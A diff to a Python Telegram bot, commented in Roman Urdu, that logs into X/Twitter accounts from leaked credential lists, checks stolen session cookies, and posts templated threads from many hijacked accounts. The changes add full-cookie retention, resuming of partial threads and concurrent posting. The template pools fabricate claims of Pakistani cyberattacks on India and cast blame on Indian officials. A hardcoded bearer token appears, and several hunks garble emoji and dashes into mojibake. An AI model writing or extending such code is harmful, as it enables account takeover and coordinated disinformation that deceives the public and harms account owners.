@@ -217,7 +217,7 @@ KEYMAP = {
 NUM_FIELDS = {"year", "followers", "friends", "posts", "likes", "media"}
 BOOL_FIELDS = {"verified", "card", "api", "developer api", "protected", "2fa", "suspended"}
 PREFIXES = ["", "", "", "", "Update:", "News:", "Breaking:", "Just in:", "Aaj:", "Note:"]
-SUFFIXES = ["", "", "", "", "!", ".", " 🔥", " ✔"]
+SUFFIXES = ["", "", "", "", "!", ".", " ðŸ”¥", " âœ”"]
 BEARER = ("AAAAAAAAAAAAAAAAAAAAANRILgAAAAAAnNwIzUejRCOuH5E6I8xnZz4puTs"
           "%3D1Zv7ttfk8LF81IUq16cHjhLTvJu4FA33AGWWjCpTnA")
 UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
@@ -400,7 +400,7 @@ async def db_upsert(client, rows):
     if not rows:
         return 0, "no username"
 
-    async def push(chunk):
+    async def push(chunk, depth=0):
         try:
             r = await client.post(
                 db_url(), params={"on_conflict": "username"},
@@ -411,11 +411,10 @@ async def db_upsert(client, rows):
             logging.warning("db_upsert %s %s", r.status_code, r.text[:200])
         except Exception:
             logging.exception("db_upsert")
-        if len(chunk) > 1:
+        if len(chunk) > 1 and depth < 4:
             # Ek kharab row poore chunk ko na girde - aadha aadha retry karo.
             mid = len(chunk) // 2
-            return await push(chunk[:mid]) + await push(chunk[mid:])
-        return 0
+            return await push(chunk[:mid], depth + 1) + await push(chunk[mid:], depth + 1)
 
     ok = 0
     for i in range(0, len(rows), 200):
@@ -655,6 +654,7 @@ def load_batches():
             uid = fn[6:-5]
             with open(os.path.join(STATE_DIR, fn), encoding="utf-8") as f:
                 d = json.load(f)
+                d = _sanitize_batch_for_save(d)  # purane batches se credentials hatao
             if d.get("lines"):
                 BATCH[uid] = {"tmp": tempfile.mkdtemp(prefix="em_rec_"), "msg": None,
                               "lines": d["lines"], "results": d.get("results", []),
@@ -1316,6 +1316,7 @@ async def ulp_login(ulp):
             "subtask_versions": {}}, start=True)
         ft = j.get("flow_token")
         if not ft:
+            await cl.aclose()
             return cl, False, {}
         j = await _task(cl, {"flow_token": ft, "subtask_inputs": [
             {"subtask_id": "LoginJsInstrumentationSubtask",
@@ -1734,7 +1735,7 @@ SLOTS = {
     "extra": ["Ab dekhna India kya bahana banata hai.", "Screenshot le lo, kal delete ho jayega.",
               "Ye sirf teaser hai.", "Aur bhi baaki hai.", "Bookmark kar lo."],
     "n": ["4", "6", "8", "12", "18"],
-    "emoji": ["🇵🇰", "🔥", "⚡️", "🦅", "🖤", "🚀"],
+    "emoji": ["ðŸ‡µðŸ‡°", "ðŸ”¥", "âš¡ï¸", "ðŸ¦…", "ðŸ–¤", "ðŸš€"],
     "blame": ["Hamare developers ne basics chhode", "Politics ne security se zyada waqt liya",
               "Basics pe kaam nahi hua, sirf branding hui", "Security audit kabhi hui hi nahi",
               "Purana code, purani galti", "Testing zero, sirf deadline",
@@ -1757,49 +1758,49 @@ SLOTS = {
 
 AUTO_POOLS = {
     "PK": [
-        "Alhamdulillah. {team} ne {target} ka {asset} {verb} kar diya — aur {claim}.",
+        "Alhamdulillah. {team} ne {target} ka {asset} {verb} kar diya â€” aur {claim}.",
         "{emoji} Boys ne kaam kar dikhaya. {target} ke {asset} ab {state}. Pakistani team ne {feat}.",
-        "Sun lo India walo — {team} ne {target} ko {damage}. {claim} Aik hi raat mein.",
+        "Sun lo India walo â€” {team} ne {target} ko {damage}. {claim} Aik hi raat mein.",
         "MashaAllah. Jis cheez pe India ko ghuroor tha, wohi {asset} hamare boys ne {verb}. {claim}",
-        "Ye hui na baat. {target} pe {team} ka {attack_type} — {claim}. Ab batao kaun {feat}?",
-        "Pakistan se aya hai {emoji} — {team} ne {target} {verb}, aur {claim}. {extra}",
-        "Record hai bhai. {target} ka {asset} {state} — {team} ka {attack_type}. {claim}",
+        "Ye hui na baat. {target} pe {team} ka {attack_type} â€” {claim}. Ab batao kaun {feat}?",
+        "Pakistan se aya hai {emoji} â€” {team} ne {target} {verb}, aur {claim}. {extra}",
+        "Record hai bhai. {target} ka {asset} {state} â€” {team} ka {attack_type}. {claim}",
         "Tareekh likh gaye boys. {target} {damage}, aur India ka {asset} {state}. {claim}",
         "Alhamdulillah, aaj {team} ne sabit kar diya ke {feat}. {target} ka {asset} {state}.",
-        "{emoji} {team} zinda hai. {target} pe {attack_type} — {claim}. Ye sirf shuruaat hai.",
-        "Boys, salaam. {target} {damage} — aur ye sirf {n} ghante mein. {claim} {extra}",
+        "{emoji} {team} zinda hai. {target} pe {attack_type} â€” {claim}. Ye sirf shuruaat hai.",
+        "Boys, salaam. {target} {damage} â€” aur ye sirf {n} ghante mein. {claim} {extra}",
         "Pakistan ka jawab: {target} ka {asset} {state}. {team} ne {attack_type} kiya. {claim}",
         "{emoji} Ek raat, ek team, aur {target} ka {asset} {state}. {claim} {extra}",
-        "Chhota sa update: {target} {damage}. {team} ka {attack_type} — {claim}.",
+        "Chhota sa update: {target} {damage}. {team} ka {attack_type} â€” {claim}.",
     ],
     "IN": [
-        "Sach maano — {target} {damage}. {blame}. {claim}",
+        "Sach maano â€” {target} {damage}. {blame}. {claim}",
         "Ye hamari {blame_short}. {target} ka {asset} {state} aur hum {reaction}. {claim}",
         "India ko kisi ne nahi hara, {blame_short} ne hara diya. {target} {damage}.",
         "Breaking: {target} {damage}. Wajah? {blame}. Ye {sector} ki nakami hai.",
-        "{emoji} Sharam ki baat hai — {target} ka {asset} {state}, aur {blame}.",
-        "Hum sab {reaction} — {target} {damage}. {blame}. {claim}",
+        "{emoji} Sharam ki baat hai â€” {target} ka {asset} {state}, aur {blame}.",
+        "Hum sab {reaction} â€” {target} {damage}. {blame}. {claim}",
         "Aaj jo hua woh {sector} ka result hai. {target} ka {asset} {state}. {blame}.",
         "Kisi ko {sector} ki fikar hi nahi. {target} {damage} aur {blame}. {claim}",
         "Bilkul {blame_short}. {target} {damage}, {asset} {state}. Ab hum {reaction}.",
-        "{target} ka {asset} {state} — aur top pe baithe log {reaction}. {blame}. {claim}",
+        "{target} ka {asset} {state} â€” aur top pe baithe log {reaction}. {blame}. {claim}",
         "Sawaal ye hai: {target} {damage} to {blame_short} kaun lega? {blame}. {claim}",
         "{emoji} {target} {damage}, {asset} {state}. Ye {sector} ki sharam hai. {blame}.",
-        "Report: {target} {damage}. {blame}. Hum ab {reaction} — {claim}",
+        "Report: {target} {damage}. {blame}. Hum ab {reaction} â€” {claim}",
     ],
     "OTHER": [
-        "BREAKING: {target} {damage} — {scope} bhi mutasir. {detail}",
+        "BREAKING: {target} {damage} â€” {scope} bhi mutasir. {detail}",
         "{emoji} Developing: {target} ka {asset} {state}. {detail} {reaction}",
-        "Just in — {target} {damage}. Sources ke mutabiq {detail}",
+        "Just in â€” {target} {damage}. Sources ke mutabiq {detail}",
         "{scope} ne {target} pe bara {attack_type} confirm kiya. {detail}",
         "World news: {target} {damage}, {asset} {state}. {detail} {reaction}",
         "Alert: {target} {damage}. {detail}. {reaction}",
-        "Ye bara hai — {target} ka {asset} {state}, aur {scope} khamosh. {detail}",
+        "Ye bara hai â€” {target} ka {asset} {state}, aur {scope} khamosh. {detail}",
         "{emoji} Big loss for India: {target} {damage}. {detail}",
         "Monitoring: {target} pe {attack_type}. {detail} {reaction}",
-        "Confirmed: {target} {damage}. {detail} — {scope} ne notice liya hai.",
+        "Confirmed: {target} {damage}. {detail} â€” {scope} ne notice liya hai.",
         "Notable: {target} ka {asset} {state}. {detail} {reaction}",
-        "{emoji} India ke liye bara dhakka — {target} {damage}. {detail}",
+        "{emoji} India ke liye bara dhakka â€” {target} {damage}. {detail}",
     ],
 }
 
@@ -1894,7 +1895,7 @@ def build_body(cfg, role):
         extra = random.choice(SLOTS["extra"])
         if extra.lower() not in body.lower():
             body = body.rstrip(". ") + " " + extra
-    body = body.rstrip(".!, ") + random.choice([".", "!", ".", " —", " ⚡️", "."])
+    body = body.rstrip(".!, ") + random.choice([".", "!", ".", " â€”", " âš¡ï¸", "."])
     if random.random() < 0.22:
         w = body.split(". ")
         if len(w) > 1:
@@ -2335,7 +2336,8 @@ async def run_campaign(u, c, doc):
         save_camp(uid)
         if (state["posted"] or state.get("partial")) and not state.get("reported"):
             save_del_batch(uid, str(int(time.time())),
-                           state["posted"] + state.get("partial", []))
+                           state["posted"],
+                           partial=state.get("partial", []))
         shutil.rmtree(tmp, ignore_errors=True)
 
 
@@ -2398,7 +2400,8 @@ async def run_campaign_db(u, uid):
         save_camp(uid)
         if (state["posted"] or state.get("partial")) and not state.get("reported"):
             save_del_batch(uid, str(int(time.time())),
-                           state["posted"] + state.get("partial", []))
+                           state["posted"],
+                           partial=state.get("partial", []))
 
 
 async def _campaign_run(u, cfg, accounts, state, uid):
@@ -2419,12 +2422,16 @@ async def _campaign_run(u, cfg, accounts, state, uid):
     await _edit(msg, "Campaign khatam.")
 
 
-def save_del_batch(uid, bid, posted):
+def save_del_batch(uid, bid, posted, partial=None):
     """Save posted tweet ids so /delbatch can remove them later.
 
-    Sirf auth_token + ct0 rakho - delete ke liye bas yehi chahiye, baaki
-    cookie lines disk par na likhein.
+    Sirf auth_token + ct0 rakho posted entries ke liye - delete ke liye bas
+    yehi chahiye. Partial threads ke liye poore cookies save karo taake
+    /camp resume_partial se baaki parts post kiye ja sakein.
     """
+    if partial is None:
+        partial = []
+    partial_usernames = {p["username"] for p in partial}
     if not posted:
         return None
     try:
@@ -2432,19 +2439,26 @@ def save_del_batch(uid, bid, posted):
         path = os.path.join(DEL_DIR, str(uid) + "_camp" + str(bid) + ".json")
         slim = []
         for p in posted:
-            ck = {}
-            for c in (p.get("cookies") or []):
-                parts = c.split("\t")
-                if len(parts) >= 7 and parts[5] in ("auth_token", "ct0"):
-                    ck[parts[5]] = parts[6].rstrip("\r")
-            slim.append({"username": p["username"], "ids": p["ids"],
-                         "cookies": ck})
+            if p["username"] in partial_usernames:
+                # Partial thread - full cookies chahiye resume ke liye.
+                slim.append({"username": p["username"], "ids": p["ids"],
+                             "cookies": p.get("cookies") or [],
+                             "partial": True})
+            else:
+                ck = {}
+                for c in (p.get("cookies") or []):
+                    parts = c.split("\t")
+                    if len(parts) >= 7 and parts[5] in ("auth_token", "ct0"):
+                        ck[parts[5]] = parts[6].rstrip("\r")
+                slim.append({"username": p["username"], "ids": p["ids"],
+                             "cookies": ck})
         with open(path, "w", encoding="utf-8") as fh:
             json.dump(slim, fh)
         return path
     except Exception:
         logging.exception("save_del_batch")
         return None
+
 
 
 async def send_report(u, uid, state, cfg):
@@ -2476,7 +2490,7 @@ async def send_report(u, uid, state, cfg):
                          + " | parts=" + str(len(p["ids"])))
         lines.append("(cleanup_partial off: ye parts delete nahi hue)")
     if posted or partial:
-        save_del_batch(uid, bid, posted + partial)
+        save_del_batch(uid, bid, posted, partial=partial)
         state["reported"] = True
     d = tempfile.mkdtemp(prefix="rep_")
     op = os.path.join(d, "report.zip")
@@ -2568,6 +2582,7 @@ async def reverify_pass(bot, notify=True):
         sem = asyncio.Semaphore(max(REVERIFY_CONC, 1))
         alive = dead = unknown = 0
         dead_names = []
+        db_updates = []
 
         async def one(row):
             nonlocal alive, dead, unknown
@@ -2577,8 +2592,8 @@ async def reverify_pass(bot, notify=True):
                 # Cookies hi nahi to har pass mein yehi rows scan ko block
                 # karti hain - inhe unknown mark karke live se hata do.
                 if uname:
-                    await db_patch(client, uname, {"status": "unknown",
-                                                   "last_check": now_iso()})
+                    db_updates.append({"username": uname, "status": "unknown",
+                                       "last_check": now_iso()})
                 return
             async with sem:
                 try:
@@ -2588,11 +2603,12 @@ async def reverify_pass(bot, notify=True):
                 except Exception:
                     det = {"Status": "UNKNOWN"}
                 status = det.get("Status")
+                now = now_iso()
                 if status == "LIVE":
                     alive += 1
-                    await db_patch(client, uname, {
-                        "status": "live", "fails": 0, "last_check": now_iso(),
-                        "last_ok": now_iso(),
+                    db_updates.append({
+                        "username": uname, "status": "live", "fails": 0,
+                        "last_check": now, "last_ok": now,
                         "country": det.get("Country") or row.get("country"),
                         "yr": det.get("Year") or row.get("yr"),
                         "followers": as_int(det.get("Followers")),
@@ -2605,22 +2621,24 @@ async def reverify_pass(bot, notify=True):
                     if "locked" in why or "suspend" in why:
                         # Locked/suspended account unlock ho sakta hai - purge
                         # mat karo, sirf dead mark karke chhodo.
-                        await db_patch(client, uname, {"status": "dead",
-                                                       "last_check": now_iso()})
+                        db_updates.append({"username": uname, "status": "dead",
+                                           "last_check": now})
                     elif fails >= DEAD_AFTER:
                         dead_names.append(uname)
-                        await db_patch(client, uname, {"status": "dead",
-                                                       "fails": fails,
-                                                       "last_check": now_iso()})
+                        db_updates.append({"username": uname, "status": "dead",
+                                           "fails": fails, "last_check": now})
                     else:
-                        await db_patch(client, uname, {"fails": fails,
-                                                       "last_check": now_iso()})
+                        db_updates.append({"username": uname, "fails": fails,
+                                           "last_check": now})
                 else:
                     unknown += 1
-                    await db_patch(client, uname, {"last_check": now_iso()})
+                    db_updates.append({"username": uname, "last_check": now})
                 await asyncio.sleep(0.3)
 
         await asyncio.gather(*(one(r) for r in rows))
+        # Batch DB updates instead of one PATCH per account
+        if db_updates:
+            await db_upsert(client, db_updates)
         purged = await db_delete(client, dead_names) if dead_names else 0
     if notify and bot is not None:
         txt = ("REVERIFY\nalive " + str(alive) + " | dead " + str(dead)
@@ -3692,7 +3710,7 @@ CMD_PAGES = [
   "Limit MAX_FILES = 5000 per file.")),
  ("4. Verify / Split / Extract", (
   "/verify\nMode verify. Phir zip bhejo: working/ + dead/ + unknown/ + summary.txt.\n"
-  "unknown = net/server error, dead nahi — dobara verify karo.\n\n"
+  "unknown = net/server error, dead nahi â€” dobara verify karo.\n\n"
   "/split <field> <buckets>\nAdmin. /split followers 0-100,100-500,1000+\n"
   "/split country PK,IN\n/split year 2010-2015,2016-2020\n"
   "Output: split_<bucket>/ + unmatched/ + summary.txt.\n\n"
@@ -3706,10 +3724,10 @@ CMD_PAGES = [
   "Output: results.txt, success.txt, failed.txt.")),
  ("6. Campaign banao", (
   "Admin.\n/camp new <name>\n/camp role PK|IN|OTHER (PK = appreciation, IN = loss, OTHER = breaking)\n"
-  "/camp text — phir messages = variants\n/camp auto on|off|ALL — built-in pool\n"
-  "/camp media — photo/video pool\n/camp mediaclear\n/camp tag #Tag\n"
+  "/camp text â€” phir messages = variants\n/camp auto on|off|ALL â€” built-in pool\n"
+  "/camp media â€” photo/video pool\n/camp mediaclear\n/camp tag #Tag\n"
   "/camp parts 1-6\n/camp delay 45-110\n/camp cleanup on|off\n"
-  "/camp preview — sample posts\n/camp dry — bina post test\n/camp status\n/camp reset")),
+  "/camp preview â€” sample posts\n/camp dry â€” bina post test\n/camp status\n/camp reset")),
  ("7. Campaign chalao", (
   "Admin.\n/camp filter country PK,IN\n/camp filter year 2014-2021\n/camp filter followers 500\n"
   "/camp filter protected on\n/camp filter clear\n/camp limit 500\n"
@@ -3750,10 +3768,10 @@ CMD_PAGES = [
 def _cmd_kb(n):
     row = []
     if n > 0:
-        row.append(InlineKeyboardButton("◀", callback_data="cmdp:%d" % (n - 1)))
+        row.append(InlineKeyboardButton("â—€", callback_data="cmdp:%d" % (n - 1)))
     row.append(InlineKeyboardButton("%d/%d" % (n + 1, len(CMD_PAGES)), callback_data="cmdp:%d" % n))
     if n < len(CMD_PAGES) - 1:
-        row.append(InlineKeyboardButton("▶", callback_data="cmdp:%d" % (n + 1)))
+        row.append(InlineKeyboardButton("â–¶", callback_data="cmdp:%d" % (n + 1)))
     return InlineKeyboardMarkup([row])
 
 
@@ -3800,7 +3818,7 @@ async def start(u, c):
 
 async def help_cmd(u, c):
     await u.message.reply_text(
-        "ULP: user:pass | email:pass | ...:2fa — code aaye to 'username code'\n"
+        "ULP: user:pass | email:pass | ...:2fa â€” code aaye to 'username code'\n"
         "VERIFY: /verify > zip\nSTORE: /store ask|file|both|db\n"
         "CAMPAIGN: /camp new > /camp text > /camp filter > /camp start\n"
         "EXTRACT: /extract country PK,IN year 2015-2020\n\nSab kuch: /commands")
@@ -4399,7 +4417,7 @@ async def camp_cmd(u, c):
     if sub == "text":
         cfg["stage"] = "text"
         save_camp(uid)
-        await u.message.reply_text("Role " + cfg["role"] + " — variants bhejo. /camp idle se band.")
+        await u.message.reply_text("Role " + cfg["role"] + " â€” variants bhejo. /camp idle se band.")
     elif sub == "idle":
         cfg["stage"] = "idle"
         save_camp(uid)
@@ -4553,6 +4571,12 @@ async def camp_cmd(u, c):
         cfg["stage_at"] = time.time()
         save_camp(uid)
         await u.message.reply_text("Ab cookie zip bhejo.")
+    elif sub == "resume_partial":
+        bid = (a[1] if len(a) > 1 else "").strip()
+        if not bid:
+            await u.message.reply_text("Bid do: /camp resume_partial camp<id>")
+            return
+        await resume_partial_batch(u, bid)
     elif sub == "reset":
         for m in cfg.get("media", []):
             try:
@@ -4567,6 +4591,80 @@ async def camp_cmd(u, c):
         await u.message.reply_text("Reset.")
     else:
         await u.message.reply_text("Subcommand samajh nahi aayi. /camp dekho.")
+
+
+async def resume_partial_batch(u, bid):
+    """Partial threads ke baaki parts post karo."""
+    uid = str(u.effective_user.id)
+    path = os.path.join(DEL_DIR, os.path.basename(uid + "_" + bid + ".json"))
+    if not os.path.exists(path):
+        await u.message.reply_text("Partial batch nahi mila: " + bid)
+        return
+    with open(path, encoding="utf-8") as f:
+        items = json.load(f)
+    partials = [it for it in items if it.get("partial")]
+    if not partials:
+        await u.message.reply_text("Koi partial thread nahi hai is batch mein.")
+        return
+    msg = await u.message.reply_text("Resuming " + str(len(partials)) + " partial threads...")
+    cfg = CAMPS.get(uid)
+    if not cfg:
+        await u.message.reply_text("Pehle /camp new <name> karo.")
+        return
+    posted_count = 0
+    fail_count = 0
+    async with http_client() as client:
+        for it in partials:
+            ck_raw = it.get("cookies") or []
+            if isinstance(ck_raw, dict):
+                ck = ck_raw
+            else:
+                ck = cookie_dict(ck_raw)
+            if not ck:
+                fail_count += 1
+                continue
+            _ = it["username"]
+            already_posted = it.get("ids") or []
+            role = it.get("role", "OTHER")
+            parts = compose(cfg, role)
+            remaining = parts[len(already_posted):]
+            if not remaining:
+                posted_count += 1
+                continue
+            data = {"tweet_mode": "extended", "auto_populate_reply_metadata": "false"}
+            if already_posted:
+                data["in_reply_to_status_id"] = already_posted[-1]
+            ok = True
+            new_ids = list(already_posted)
+            for i2, part in enumerate(remaining):
+                if part.strip():
+                    data["status"] = part
+                else:
+                    data["status"] = "."
+                if new_ids:
+                    data["in_reply_to_status_id"] = new_ids[-1]
+                j, err = await _tweet_req(client, ck, data)
+                if err:
+                    ok = False
+                    break
+                tid = j.get("id_str") if isinstance(j, dict) else None
+                if tid:
+                    new_ids.append(tid)
+                if i2 < len(remaining) - 1:
+                    await asyncio.sleep(random.uniform(THREAD_GAP_MIN, THREAD_GAP_MAX))
+            if ok:
+                it["ids"] = new_ids
+                posted_count += 1
+            else:
+                fail_count += 1
+            await asyncio.sleep(random.uniform(POST_MIN, POST_MAX))
+    try:
+        with open(path, "w", encoding="utf-8") as f:
+            json.dump(items, f)
+    except Exception:
+        logging.exception("resume_partial save")
+    await _edit(msg, "Resume complete | posted " + str(posted_count) + " | fail " + str(fail_count))
+    await u.message.reply_text("/delbatch " + bid + " se saare threads delete karein.")
 
 
 async def stopcamp_cmd(u, c):
@@ -4645,8 +4743,11 @@ async def run_tweet_batch(u, doc):
             prog = Progress(msg, len(names), "TWEET")
             prog.phase = "Posting"
             filt, variants = t.get("filter") or [], t.get("variants") or [""]
-            async with http_client() as client:
-                for name in names:
+
+            sem = asyncio.Semaphore(max(CONCURRENCY, 1))
+
+            async def one(name):
+                async with sem:
                     try:
                         raw = zip_read_text(zin, name)
                         data, cookies = parse_cookie_file(raw)
@@ -4654,37 +4755,43 @@ async def run_tweet_batch(u, doc):
                         if not ck:
                             failed.append(name + " | no cookies")
                             prog.fail += 1
-                            prog.done += 1
-                            await prog.update()
-                            continue
-                        if filt and to_iso(await asyncio.wait_for(detect_country(client, ck),
-                                                                  ACC_TIMEOUT)) not in filt:
-                            prog.done += 1
-                            await prog.update()
-                            continue
+                            return
+                        if filt:
+                            iso = to_iso(await asyncio.wait_for(detect_country(client, ck),
+                                                               ACC_TIMEOUT))
+                            if iso not in filt:
+                                return
                         ids, terr = await post_tweet(client, ck,
-                                                     randomize(random.choice(variants)), t.get("media"))
+                                                     randomize(random.choice(variants)),
+                                                     t.get("media"))
                         uname = data.get("Username", "") or name
                         if not terr and ids:
-                            links.append(uname + " | https://x.com/" + uname + "/status/" + ids[0])
-                            saved.append({"username": uname, "ids": ids, "cookies": cookies})
+                            links.append(uname + " | https://x.com/" + uname + "/status/"
+                                         + ids[0])
+                            saved.append({"username": uname, "ids": ids,
+                                          "cookies": cookies})
                             prog.ok += 1
                         elif ids:
                             # Thread beech me fail hua: jo parts post hue wo save karo,
                             # warna /delbatch se delete hi nahi ho payenge.
-                            saved.append({"username": uname, "ids": ids, "cookies": cookies})
-                            failed.append(uname + " | " + (terr or "fail") + " (partial)")
+                            saved.append({"username": uname, "ids": ids,
+                                          "cookies": cookies})
+                            failed.append(uname + " | " + (terr or "fail")
+                                          + " (partial)")
                             prog.fail += 1
                         else:
                             failed.append(uname + " | " + (terr or "fail"))
                             prog.fail += 1
+                    except asyncio.CancelledError:
+                        raise
                     except Exception as e:
                         logging.exception("tweet %s", name)
                         failed.append(name + " | " + str(e))
                         prog.fail += 1
-                    prog.done += 1
-                    await prog.update()
-                    await asyncio.sleep(random.uniform(POST_MIN, POST_MAX))
+
+            async with http_client() as client:
+                await pmap_progress(prog, one, names, CONCURRENCY)
+                await prog.update(force=True)
         if saved:
             os.makedirs(DEL_DIR, exist_ok=True)
             with open(os.path.join(DEL_DIR, uid + "_" + batch_id + ".json"), "w", encoding="utf-8") as f:
@@ -4812,6 +4919,14 @@ async def broadcast_cmd(u, c):
         try:
             await bot.send_message(int(uid), text)
             sent += 1
+        except RetryAfter as e:
+            wait = getattr(e, "retry_after", 5)
+            await asyncio.sleep(min(wait, 60))
+            try:
+                await bot.send_message(int(uid), text)
+                sent += 1
+            except Exception:
+                fail += 1
         except Exception:
             fail += 1
         await asyncio.sleep(0.05)
@@ -5569,3 +5684,6 @@ def main():
 
 if __name__ == "__main__":
     main()
+
+
+
